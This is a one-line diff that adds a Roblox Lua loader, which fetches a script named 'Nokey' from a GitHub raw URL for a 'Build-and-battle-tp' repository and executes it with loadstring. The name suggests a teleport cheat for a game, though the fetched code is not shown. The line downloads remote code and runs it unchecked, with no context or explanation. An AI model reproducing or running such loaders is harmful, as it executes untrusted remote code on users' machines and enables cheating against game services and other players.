@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Linhmcfake1/Build-and-battle-tp/main/Nokey"))()
